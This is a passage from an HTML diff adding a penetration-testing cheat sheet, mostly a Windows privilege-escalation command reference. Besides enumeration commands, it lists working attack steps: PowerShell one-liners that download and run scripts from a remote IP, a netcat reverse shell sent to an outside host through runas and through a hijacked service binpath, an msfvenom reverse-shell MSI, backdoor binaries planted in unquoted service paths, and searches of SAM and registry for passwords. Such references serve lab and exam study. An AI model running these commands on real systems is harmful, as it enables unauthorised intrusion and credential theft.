+                    <div class="tool-command">Configure Phishing: Follow documentation to configure phishing attacks.</div>
+                </div>
+            </div>
+
+            <!-- Miscellaneous Tools -->
+            <h2>Misc Tools</h2>
+
+            <!-- Wireshark Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('wireshark')">Wireshark - Network protocol analyzer.</div>
+                <div class="tool-details" id="wireshark">
+                    <div class="tool-command">Start Wireshark: <code>wireshark</code></div>
+                    <div class="tool-command">Capture Traffic: <code>File > Open > [capture_file]</code></div>
+                </div>
+            </div>
+
+            <!-- Burp Suite Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('burpsuite')">Burp Suite - Web vulnerability scanner and proxy.</div>
+                <div class="tool-details" id="burpsuite">
+                    <div class="tool-command">Start Burp Suite: <code>burpsuite</code></div>
+                    <div class="tool-command">Configure Proxy: Set browser to use Burp Suite's proxy.</div>
+                </div>
+            </div>
+
+            <!-- Maltego Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('maltego')">Maltego - Open-source intelligence and forensics tool.</div>
+                <div class="tool-details" id="maltego">
+                    <div class="tool-command">Start Maltego: <code>maltego</code></div>
+                    <div class="tool-command">Create Transforms: Use Maltego interface to create and run transforms.</div>
+                </div>
+            </div>
+            </div>
+
+            <div id="portswigger" class="tab-content">
+                <h1>PortSwigger Academy Cheat Sheets</h1>
+                <ul>
+                    <li><a href="/markdown/API%20Testing/api-testing.html" target="_blank">API Testing</a></li>
+                    <li><a href="/markdown/Access%20Control/access-control.html" target="_blank">Access Control</a></li>
+                    <li><a href="/markdown/Authentication/authentication.html" target="_blank">Authentication</a></li>
+                    <li><a href="/markdown/Business%20Logic%20Vulnerabilities/business-logic-vulnerabilities.html" target="_blank">Business Logic Vulnerabilities</a></li>
+                    <li><a href="/markdown/Clickjacking/clickjacking.html" target="_blank">Clickjacking</a></li>
+                    <li><a href="/markdown/Command%20Injection/command-injection.html" target="_blank">Command Injection</a></li>
+                    <li><a href="/markdown/Cross-Origin%20Resource%20Sharing%20(CORS)/cors.html" target="_blank">Cross-Origin Resource Sharing (CORS)</a></li>
+                    <li><a href="/markdown/Cross-site%20Request%20Forgery%20(CSRF)/csrf.html" target="_blank">Cross-site Request Forgery (CSRF)</a></li>
+                    <li><a href="/markdown/Cross-site%20Scripting%20(XSS)/xss.html" target="_blank">Cross-site Scripting (XSS)</a></li>
+                    <li><a href="/markdown/DOM-based%20Vulnerabilities/dom.html" target="_blank">DOM-based Vulnerabilities</a></li>
+                    <li><a href="/markdown/Directory%20Traversal/directory-traversal.html" target="_blank">Directory Traversal</a></li>
+                    <li><a href="/markdown/Essential%20Skills/skills.html" target="_blank">Essential Skills</a></li>
+                    <li><a href="/markdown/Exam%20Prep/exam-prep.html" target="_blank">Exam Prep</a></li>
+                    <li><a href="/markdown/File%20Upload%20Vulnerabilities/file-upload-vuln.html" target="_blank">File Upload Vulnerabilities</a></li>
+                    <li><a href="/markdown/GraphQL%20API%20Vulnerabilities/graphql.html" target="_blank">GraphQL API Vulnerabilities</a></li>
+                    <li><a href="/markdown/HTTP%20Host%20Header%20Attacks/host-header-attacks.html" target="_blank">HTTP Host Header Attacks</a></li>
+                    <li><a href="/markdown/HTTP%20Request%20Smuggling/request-smuggling.html" target="_blank">HTTP Request Smuggling</a></li>
+                    <li><a href="/markdown/Information%20Disclosure/information-disclosure.html" target="_blank">Information Disclosure</a></li>
+                    <li><a href="/markdown/Insecure%20Deserialization/insecure-deserialization.html" target="_blank">Insecure Deserialization</a></li>
+                    <li><a href="/markdown/JWT%20Attacks/jwt-attacks.html" target="_blank">JWT Attacks</a></li>
+                    <li><a href="/markdown/NoSQL%20Injection/nosql-injection.html" target="_blank">NoSQL Injection</a></li>
+                    <li><a href="/markdown/OAuth%20Authentication/oauth-authentication.html" target="_blank">OAuth Authentication</a></li>
+                    <li><a href="/markdown/Prototype%20Pollution/prototype-pollution.html" target="_blank">Prototype Pollution</a></li>
+                    <li><a href="/markdown/Race%20Conditions/race-conditions.html" target="_blank">Race Conditions</a></li>
+                    <li><a href="/markdown/SQL%20Injection/sqli.html" target="_blank">SQL Injection</a></li>
+                    <li><a href="/markdown/Server-Side%20Template%20Injection/ssti.html" target="_blank">Server-Side Template Injection</a></li>
+                    <li><a href="/markdown/Server-side%20Request%20Forgery%20(SSRF)/ssrf.html" target="_blank">Server-side Request Forgery (SSRF)</a></li>
+                    <li><a href="/markdown/Web%20Cache%20Poisoning/web-cache-poisoning.html" target="_blank">Web Cache Poisoning</a></li>
+                    <li><a href="/markdown/WebSockets/web-sockets.html" target="_blank">WebSockets</a></li>
+                    <li><a href="/markdown/XXE%20Injection/xxe.html" target="_blank">XXE Injection</a></li>
+                </ul>
+            </div>
+                     
+
+        <!-- Windows PrivEsc Content -->
+        <div id="windowsprivesc" class="tab-content">
+            <h1>Windows Privilege Escalation</h1>
+            
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('win-checks')">Check OS, Patch level, Basic</div>
+                <div class="tool-details" id="win-checks">
+                    <div class="tool-command">systeminfo</div>
+                    <p>Description: Retrieves basic system information.</p>
+                    <pre><code>systeminfo</code></pre>
+                    <div class="tool-command">Systeminfo | findstr /B /C:"OS Name" /C:"System Type"</div>
+                    <p>Description: Filters system information for OS Name and System Type.</p>
+                    <pre><code>systeminfo | findstr /B /C:"OS Name" /C:"System Type"</code></pre>
+        
+                    <h2>Updates</h2>
+                    <div class="tool-command">wmic qfe get Caption,Description,HotFixID,InstalledOn</div>
+                    <p>Description: Lists installed Windows updates.</p>
+                    <pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></pre>
+                    <div class="tool-command">Wmic logicaldisk get caption,description</div>
+                    <p>Description: Retrieves information about logical disks.</p>
+                    <pre><code>Wmic logicaldisk get caption,description</code></pre>
+        
+                    <h2>Applications</h2>
+                    <div class="tool-command">wmic product get name, version, vendor</div>
+                    <p>Description: Lists installed products with their names, versions, and vendors.</p>
+                    <pre><code>wmic product get name, version, vendor</code></pre>
+                    <div class="tool-command">accesschk.exe -uws "Everyone" "C:\Program Files"</div>
+                    <p>Description: Checks permissions for "Everyone" on "C:\Program Files".</p>
+                    <pre><code>accesschk.exe -uws "Everyone" "C:\Program Files"</code></pre>
+                    <div class="tool-command">Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}</div>
+                    <p>Description: Checks for "Everyone" permissions on files in "C:\Program Files".</p>
+                    <pre><code>Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}</code></pre>
+        
+                    <h2>Services</h2>
+                    <div class="tool-command">sc query state=all | findstr "SERVICE_NAME:"</div>
+                    <p>Description: Lists all services with their service names.</p>
+                    <pre><code>sc query state=all | findstr "SERVICE_NAME:"</code></pre>
+                    <div class="tool-command">wmic service get name,displayname,pathname,startmode</div>
+                    <p>Description: Retrieves details of services including name, display name, pathname, and start mode.</p>
+                    <pre><code>wmic service get name,displayname,pathname,startmode</code></pre>
+                    <div class="tool-command">Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}</div>
+                    <p>Description: Lists running services with their names and pathnames.</p>
+                    <pre><code>Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}</code></pre>
+        
+                    <h2>Volume</h2>
+                    <div class="tool-command">mountvol</div>
+                    <p>Description: Displays or specifies a volume mount point.</p>
+                    <pre><code>mountvol</code></pre>
+        
+                    <h2>Drivers - in PowerShell</h2>
+                    <div class="tool-command">driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path</div>
+                    <p>Description: Lists drivers with detailed information.</p>
+                    <pre><code>driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path</code></pre>
+                    <div class="tool-command">Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}</div>
+                    <p>Description: Retrieves details about signed drivers for VMware devices.</p>
+                    <pre><code>Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}</code></pre>
+        
+                    <h2>Current User Info</h2>
+                    <div class="tool-command">whoami</div>
+                    <p>Description: Displays the current user.</p>
+                    <pre><code>whoami</code></pre>
+                    <div class="tool-command">echo %USERNAME%</div>
+                    <p>Description: Displays the username of the current user.</p>
+                    <pre><code>echo %USERNAME%</code></pre>
+        
+                    <h2>Privileges and Groups</h2>
+                    <div class="tool-command">whoami /priv</div>
+                    <p>Description: Lists user privileges.</p>
+                    <pre><code>whoami /priv</code></pre>
+                    <div class="tool-command">whoami /groups</div>
+                    <p>Description: Lists user groups.</p>
+                    <pre><code>whoami /groups</code></pre>
+                    <div class="tool-command">whoami /all</div>
+                    <p>Description: Lists all user information.</p>
+                    <pre><code>whoami /all</code></pre>
+                    <div class="tool-command">net user</div>
+                    <p>Description: Lists all user accounts.</p>
+                    <pre><code>net user</code></pre>
+                    <div class="tool-command">net localgroup</div>
+                    <p>Description: Lists local groups.</p>
+                    <pre><code>net localgroup</code></pre>
+                    <div class="tool-command">net user /domain</div>
+                    <p>Description: Lists users in the domain.</p>
+                    <pre><code>net user /domain</code></pre>
+                    <div class="tool-command">net group /domain</div>
+                    <p>Description: Lists groups in the domain.</p>
+                    <pre><code>net group /domain</code></pre>
+                    <div class="tool-command">net group /domain &lt;Group Name&gt;</div>
+                    <p>Description: Lists members of a specific domain group.</p>
+                    <pre><code>net group /domain &lt;Group Name&gt;</code></pre>
+                </div>
+            </div>
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('win-firewall-av-defender')">Firewall / AV / Defender</div>
+                <div class="tool-details" id="win-firewall-av-defender">
+                    <div class="tool-command">Example command: <code>netsh firewall show state</code></div>
+                    <p>Description of this technique for Windows.</p>
+                    <ul>
+                        <li><code>netsh firewall show state</code></li>
+                        <li><code>netsh firewall show config</code></li>
+                        <li><code>sc query windefend</code></li>
+                        <li><code>netsh advfirewall firewall dump</code></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('win-network')">Network</div>
+                <div class="tool-details" id="win-network">
+                    <div class="tool-command">Example command: <code>ipconfig /all</code></div>
+                    <p>Description of network-related commands for Windows.</p>
+                    <ul>
+                        <li><code>ipconfig /all</code></li>
+                        <li><code>route print</code></li>
+                        <li><code>arp -A</code></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('win-checklist-tools')">Checklist Automated Tools</div>
+                <div class="tool-details" id="win-checklist-tools">
+                    <p>Run the following automated tools and commands for a comprehensive checklist:</p>
+                    <ul>
+                        <li><code>Run winpeas</code></li>
+                        <li><code>Run PowerUp.ps1</code></li>
+                        <li><code>powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.155/PowerUp.ps1');Invoke-AllChecks"</code></li>
+                        <li><code>Run Sherlock.ps1</code></li>
+                        <li><code>powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.155/Sherlock.ps1');Find-AllVulns"</code></li>
+                        <li><code>accesschk.exe /accepteula -wvu</code></li>
+                        <li><code>Folder Perms:</code></li>
+                        <ul>
+                            <li><code>\\192.168.119.155\test\accesschk.exe /accepteula -uwdqs "Authenticated Users" C:\</code></li>
+                            <li><code>\\192.168.119.155\test\accesschk.exe /accepteula -uwdqs "Everyone" C:\</code></li>
+                        </ul>
+                        <li><code>File Perms:</code></li>
+                        <ul>
+                            <li><code>\\192.168.119.155\test\accesschk.exe /accepteula -uwqs "Authenticated Users" C:\*.*</code></li>
+                            <li><code>\\192.168.119.155\test\accesschk.exe /accepteula -uwdqs "Everyone" C:\*.*</code></li>
+                        </ul>
+                        <li><code>Run JAWS</code></li>
+                        <li><code>Executables:</code></li>
+                        <ul>
+                            <li><code>WinPEAS.exe /.bat *</code></li>
+                            <li><code>Seatbelt.exe</code></li>
+                            <li><code>Watson.exe *</code></li>
+                            <li><code>Sharpup.exe</code></li>
+                            <li><code>windows-privesc-check2.exe --dump -G</code></li>
+                        </ul>
+                        <li><code>Powershell:</code></li>
+                        <ul>
+                            <li><code>Sherlock.ps1 *</code></li>
+                            <li><code>PowerUp.ps1 *</code></li>
+                            <li><code>jaws-enumps1 *</code></li>
+                        </ul>
+                        <li><code>Other:</code></li>
+                        <ul>
+                            <li><code>Windows-exploit-suggester.py *</code></li>
+                            <li><code>Systeminfo -> a text file and run it with windows exploit suggester.py, search for exploit in SecWiki github</code></li>
+                            <li><code>MSF exploit suggester *</code></li>
+                            <li><code>In a meterpreter session – run /post/multi/recon/local_exploit_suggester - > shows list of kernel</code></li>
+                        </ul>
+                    </ul>
+                </div>
+            </div>
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('win-installed-apps-services')">Installed Applications and Services</div>
+                <div class="tool-details" id="win-installed-apps-services">
+                    <p>Use the following commands to gather information about installed applications and services:</p>
+                    <ul>
+                        <li><code>tasklist /SVC</code> - List running processes and their associated services.</li>
+                        <li><code>net start</code> - List Windows services that are currently started.</li>
+                        <li><code>DRIVERQUERY</code> - Look for 3rd party drivers.</li>
+                        <li><code>wmic /?</code> - Check if WMIC is allowed on a low privilege shell (mostly allowed on Win7/Win8).</li>
+                        <li><code>Automated WMIC info:</code> <a href="https://www.fuzzysecurity.com/tutorials/files/wmic_info.rar">WMIC Info Tutorial</a></li>
+                        <li><code>wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."</code> - Get Windows updates information.</li>
+                        <li><code>cacls "C:\Python27"</code> - Check directory permissions.</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('win-scheduled-tasks')">Scheduled Tasks</div>
+                <div class="tool-details" id="win-scheduled-tasks">
+                    <p>Use the following commands to gather information about scheduled tasks:</p>
+                    <ul>
+                        <li><code>schtasks /query /fo LIST /v</code> - Query scheduled tasks and save to <code>schtasks.txt</code> locally. Then run:
+                            <pre>cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM</pre>
+                        </li>
+                        <li><code>dir %SystemRoot%\Tasks</code> - List scheduled tasks in the default directory.</li>
+                        <li><code>e.g. c:\windows\tasks\</code> - Alternate location for scheduled tasks.</li>
+                        <li><code>e.g. c:\windows\system32\tasks\</code> - Alternate location for scheduled tasks.</li>
+                        <li><code>accesschk.exe -dqv "E:\GrabLogs"</code> - Check permissions on the scheduled tasks binary directory.</li>
+                        <li><code>copy evil-tftp.exe E:\GrabLogs\tftp.exe</code> - If write permissions are available, copy a file to the scheduled tasks directory.</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('win-startups-autoruns')">Startups and Autoruns</div>
+                <div class="tool-details" id="win-startups-autoruns">
+                    <p>Use the following commands to gather information about startup programs and autoruns:</p>
+                    <ul>
+                        <li><code>reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> - Query the registry for startup programs set for the current user.</li>
+                        <li><code>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code> - Query the registry for startup programs set for all users.</li>
+                        <li><code>wmic startup get caption,command</code> - List startup programs and their commands.</li>
+                        <li><code>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R</code> - Query the registry for autorun entries.</li>
+                        <li><code>reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> - Query the registry for one-time run entries for the current user.</li>
+                        <li><code>dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"</code> - List startup programs for all users.</li>
+                        <li><code>dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"</code> - List startup programs for the current user.</li>
+                        <li><code>accesschk64.exe /accepteula -wvu "C:\Program Files\Autorun Program"</code> - Check access permissions on startup directories. If writable, you can place malicious binaries.</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('service-permissions')">Service Permissions</div>
+                <div class="tool-details" id="service-permissions">
+                    <div class="tool-command">Check if service config can be modified:</div>
+                    <pre><code>accesschk.exe /accepteula</code></pre>
+                    <pre><code>accesschk.exe -uwcqv "Authenticated Users" * /accepteula</code></pre>
+                    <pre><code>accesschk.exe -ucqv &lt;Service Name&gt;</code></pre>
+        
+                    <div class="tool-command">Get service details:</div>
+                    <pre><code>sc qc &lt;Service Name&gt;</code></pre>
+        
+                    <div class="tool-command">Check service with weak file permission:</div>
+                    <pre><code>wmic.exe</code></pre>
+                    <pre><code>for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt</code></pre>
+                    <pre><code>for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"</code></pre>
+        
+                    <pre><code>sc.exe</code></pre>
+                    <pre><code>sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt</code></pre>
+                    <pre><code>FOR /F %i in (Servicenames.txt) DO echo %i</code></pre>
+                    <pre><code>type Servicenames.txt</code></pre>
+                    <pre><code>FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt</code></pre>
+                    <pre><code>FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt</code></pre>
+                </div>
+            </div>
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('unquoted-service-path')">Unquoted Service Path</div>
+                <div class="tool-details" id="unquoted-service-path">
+                    <div class="tool-command">Find unquoted service paths:</div>
+                    <pre><code>wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """</code></pre>
+        
+                    <div class="tool-command">Check service configuration:</div>
+                    <pre><code>sc query</code></pre>
+                    <pre><code>sc qc &lt;service name&gt;</code></pre>
+                </div>
+            </div>
+            <!-- AlwaysInstallElevated Content -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('alwaysinstall-elevated')">AlwaysInstallElevated</div>
+                <div class="tool-details" id="alwaysinstall-elevated">
+                    <div class="tool-command">Check AlwaysInstallElevated settings:</div>
+                    <pre><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\</code></pre>
+                    <pre><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\</code></pre>
+
+                    <div class="tool-command">If AlwaysInstallElevated = 1, create an MSI payload:</div>
+                    <pre><code>msfvenom -p windows/shell_reverse_tcp lhost=&lt;LHOST&gt; lport=&lt;LPORT&gt; -f msi -o setup.msi</code></pre>
+                    <pre><code>msiexec /quiet /qn /i C:\Temp\setup.msi</code></pre>
+                </div>
+            </div>
+            <!-- Service only available from inside Content -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('service-inside')">Service only available from inside</div>
+                <div class="tool-details" id="service-inside">
+                    <div class="tool-command">Check open ports:</div>
+                    <pre><code>netstat -ano</code></pre>
+
+                    <div class="tool-command">Upload plink.exe:</div>
+                    <pre><code>plink.exe -R "remote port":127.0.0.1:"local port" root@"ipaddress"</code></pre>
+                </div>
+            </div>
+            <!-- Password in files Content -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('password-files')">Password in files</div>
+                <div class="tool-details" id="password-files">
+                    <div class="tool-command">Check for saved credentials:</div>
+                    <pre><code>cmdkey /list</code></pre>
+                    <pre><code>runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \\IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe"</code></pre>
+
+                    <div class="tool-command">Check for SAM files:</div>
+                    <pre><code>%SYSTEMROOT%\repair\SAM</code></pre>
+                    <pre><code>%SYSTEMROOT%\System32\config\RegBack\SAM</code></pre>
+                    <pre><code>%SYSTEMROOT%\System32\config\SAM</code></pre>
+                    <pre><code>%SYSTEMROOT%\repair\system</code></pre>
+                    <pre><code>%SYSTEMROOT%\System32\config\SYSTEM</code></pre>
+                    <pre><code>%SYSTEMROOT%\System32\config\RegBack\system</code></pre>
+
+                    <div class="tool-command">Search for passwords in files:</div>
+                    <pre><code>findstr /si password *.txt</code></pre>
+                    <pre><code>findstr /si password *.xml</code></pre>
+                    <pre><code>findstr /si password *.ini</code></pre>
+                    <pre><code>findstr /si password *.config</code></pre>
+                    <pre><code>findstr /si pass/pwd *.ini</code></pre>
+
+                    <div class="tool-command">Search for files with specific patterns:</div>
+                    <pre><code>dir /s *pass* == *cred* == *vnc* == *.config*</code></pre>
+                    <pre><code>findstr /spin "password" *.*</code></pre>
+
+                    <div class="tool-command">Unattended config files:</div>
+                    <pre><code>c:\sysprep.inf</code></pre>
+                    <pre><code>c:\sysprep\sysprep.xml</code></pre>
+                    <pre><code>c:\unattend.xml</code></pre>
+                    <pre><code>%WINDIR%\Panther\Unattend\Unattended.xml</code></pre>
+                    <pre><code>%WINDIR%\Panther\Unattended.xml</code></pre>
+
+                    <div class="tool-command">Search for unattended and config files:</div>
+                    <pre><code>dir /b /s unattend.xml</code></pre>
+                    <pre><code>dir /b /s web.config</code></pre>
+                    <pre><code>dir /b /s sysprep.inf</code></pre>
+                    <pre><code>dir /b /s sysprep.xml</code></pre>
+                    <pre><code>dir /b /s *pass*</code></pre>
+                    <pre><code>dir c:\*vnc.ini /s /b</code></pre>
+                    <pre><code>dir c:\*ultravnc.ini /s /b</code></pre>
+                    <pre><code>dir c:\ /s /b | findstr /si *vnc.ini</code></pre>
+                </div>
+            </div>
+            <!-- Registry Content -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('registry')">Registry</div>
+                <div class="tool-details" id="registry">
+                    <div class="tool-command">VNC:</div>
+                    <pre><code>reg query "HKCU\Software\ORL\WinVNC3\Password"</code></pre>
+                    <pre><code>reg query "HKCU\Software\TightVNC\Server"</code></pre>
+
+                    <div class="tool-command">Windows Autologin:</div>
+                    <pre><code>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</code></pre>
+                    <pre><code>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"</code></pre>
+
+                    <div class="tool-command">SNMP Parameters:</div>
+                    <pre><code>reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"</code></pre>
+
+                    <div class="tool-command">Putty:</div>
+                    <pre><code>reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"</code></pre>
+
+                    <div class="tool-command">Search for Password in Registry:</div>
+                    <pre><code>reg query HKLM /f password /t REG_SZ /s</code></pre>
+                    <pre><code>reg query HKCU /f password /t REG_SZ /s</code></pre>
+                </div>
+            </div>
+            <!-- REGSVC ACL Content -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('regsvc-acl')">REGSVC ACL</div>
+                <div class="tool-details" id="regsvc-acl">
+                    <div class="tool-command">Check for Registry Services:</div>
+                    <pre><code>Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl</code></pre>
+                    
+                    <div class="tool-command">Look for Access Group Permissions for NT AUTH/Interactive:</div>
+                    <pre><code># Check the permissions</code></pre>
+
+                    <div class="tool-command">Create a New Window Service Binary:</div>
+                    <pre><code>x86_64-w64-mingw32-gcc windows_service.c -o x.exe</code></pre>
+
+                    <div class="tool-command">Add to the Registry Path:</div>
+                    <pre><code>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f</code></pre>
+
+                    <div class="tool-command">Execute Using:</div>
+                    <pre><code>sc start regsvc</code></pre>
+                </div>
+            </div>
+            <!-- Unquoted Service Path Exploitation Content -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('unquoted-service-path')">Unquoted Service Path Exploitation</div>
+                <div class="tool-details" id="unquoted-service-path">
+                    <h3>Case 1: SeShutdownPrivilege Listed</h3>
+                    <div class="tool-command">Search for Services that Auto Start:</div>
+                    <pre><code>wmic service get name,displayname,pathname,startmode | findstr /i "auto"</code></pre>
+
+                    <div class="tool-command">Search for Non-Standard Services:</div>
+                    <pre><code>wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"</code></pre>
+
+                    <div class="tool-command">Potential Unquoted Service Example:</div>
+                    <pre><code>Heisenburg Service   heisenburgsvc     "C:\Program Files\Heisenburg\The One Who\knocks.exe"        auto</code></pre>
+
+                    <div class="tool-command">Check Permissions on Subdirectories:</div>
+                    <pre><code>icacls "C:\"</code></pre>
+                    <pre><code>icacls "C:\Program Files"</code></pre>
+                    <pre><code>icacls "C:\Program Files\Heisenburg"</code></pre>
+
+                    <div class="tool-command">Example Output for Access Permissions:</div>
+                    <pre><code>BUILTIN\Users:(F)</code></pre>
+                    <pre><code>BUILTIN\Users:(I)(RX)</code></pre>
+
+                    <div class="tool-command">Create Reverse Shell Binary and Copy:</div>
+                    <pre><code>copy %temp%\backdoor.exe "C:\Program Files\Heisenburg\The.exe"</code></pre>
+
+                    <div class="tool-command">Reboot to Have the Service Auto Start:</div>
+                    <pre><code>shutdown /r /t 0</code></pre>
+
+                    <h3>Case 2: SeShutdownPrivilege Disabled</h3>
+                    <div class="tool-command">Search for Manual Start Services:</div>
+                    <pre><code>wmic service get name,displayname,pathname,startmode | findstr /i "manual" | findstr /i /v "c:\windows"</code></pre>
+
+                    <div class="tool-command">Potential Unquoted Service Example:</div>
+                    <pre><code>Heisenburg Service   heisenburgsvc     "C:\Program Files\Heisenburg\The One Who\knocks.exe"        manual</code></pre>
+
+                    <div class="tool-command">Check Service Privileges:</div>
+                    <pre><code>.\accesschk.exe /accepteula -ucqv user heisenburgsvc</code></pre>
+
+                    <div class="tool-command">Check Permissions on Subdirectories:</div>
+                    <pre><code>icacls "C:\"</code></pre>
+                    <pre><code>icacls "C:\Program Files"</code></pre>
+                    <pre><code>icacls "C:\Program Files\Heisenburg"</code></pre>
+
+                    <div class="tool-command">Example Output for Access Permissions:</div>
+                    <pre><code>BUILTIN\Users:(F)</code></pre>
+                    <pre><code>BUILTIN\Users:(I)(RX)</code></pre>
+
+                    <div class="tool-command">Handle Spaces in Path:</div>
+                    <pre><code>copy %temp%\backdoor.exe "C:\Program Files\Heisenburg\The.exe"</code></pre>
+
+                    <div class="tool-command">Start Netcat Listener and Service:</div>
+                    <pre><code>net start heisenburgsvc</code></pre>
+                    <pre><code># net stop heisenburgsvc first if the service is already running.</code></pre>
+                </div>
+            </div>
+            <!-- Weak Service Permissions Exploitation Content -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('weak-service-permissions')">Weak Service Permissions Exploitation</div>
+                <div class="tool-details" id="weak-service-permissions">
+                    <h3>Download Accesschk</h3>
+                    <div class="tool-command">Download accesschk.exe from:</div>
+                    <pre><code>https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe</code></pre>
+
+                    <h3>List Access for All Services</h3>
+                    <div class="tool-command">List access for all services:</div>
+                    <pre><code>.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *</code></pre>
+                    <pre><code># or: .\accesschk.exe /accepteula -uwcqv user *</code></pre>
+
+                    <div class="tool-command">Example Output:</div>
+                    <pre><code>$ RW SSDPSRV</code></pre>
+                    <pre><code>$ SERVICE_ALL_ACCESS</code></pre>
+                    <pre><code>$ RW upnphost</code></pre>
+                    <pre><code>$ SERVICE_ALL_ACCESS</code></pre>
+
+                    <h3>Service Configuration</h3>
+                    <div class="tool-command">List Current Config for the Service:</div>
+                    <pre><code>sc qc upnphost</code></pre>
+
+                    <div class="tool-command">Check START TYPE and SERVICE_START_NAME:</div>
+                    <pre><code># START_TYPE         : 3   DEMAND_START</code></pre>
+                    <pre><code># SERVICE_START_NAME : NT AUTHORITY\LocalService</code></pre>
+
+                    <div class="tool-command">Change BinPath with Payload:</div>
+                    <pre><code>sc config "upnphost" binpath= "C:\WINDOWS\Temp\nc.exe 192.168.119.147 443 -e C:\WINDOWS\System32\cmd.exe"</code></pre>
+
+                    <div class="tool-command">Remove Dependencies (if any):</div>
+                    <pre><code>sc config "upnphost" depend= ""</code></pre>
+
+                    <div class="tool-command">Set to Run from System Account:</div>
+                    <pre><code>sc config "upnphost" obj= ".\LocalSystem" password= ""</code></pre>
+
+                    <div class="tool-command">Start Netcat Listener and Service:</div>
+                    <pre><code>net start "upnphost"</code></pre>
+                    <pre><code># net stop "upnphost" first if the service is already running.</code></pre>
+                </div>
+            </div>
+            <!-- Weak Service Executable File Permissions Exploitation Content -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('weak-service-executable-permissions')">Weak Service Executable File Permissions Exploitation</div>
+                <div class="tool-details" id="weak-service-executable-permissions">
+                    <h3>Verify Overwrite Permissions on Service Binary</h3>
+                    <div class="tool-command">Check if we can overwrite an existing service binary file:</div>
+                    <pre><code>icacls "C:\Program Files\Heisenburg\knocks.exe"</code></pre>
+                    <pre><code># or .\accesschk.exe /accepteula -uvwq "C:\Program Files\Heisenburg\knocks.exe"</code></pre>
+
+                    <div class="tool-command">Example Output if (builtin\users or EVERYONE) has ( (I) or (F) ) on "C:\Program Files\Heisenburg":</div>
+                    <pre><code>Everyone:(F)</code></pre>
+                    <pre><code>BUILTIN\Users:(I)(RX)</code></pre>
+                    <pre><code># Example output for accesschk.exe:</code></pre>
+                    <pre><code># RW BUILTIN\Users</code></pre>
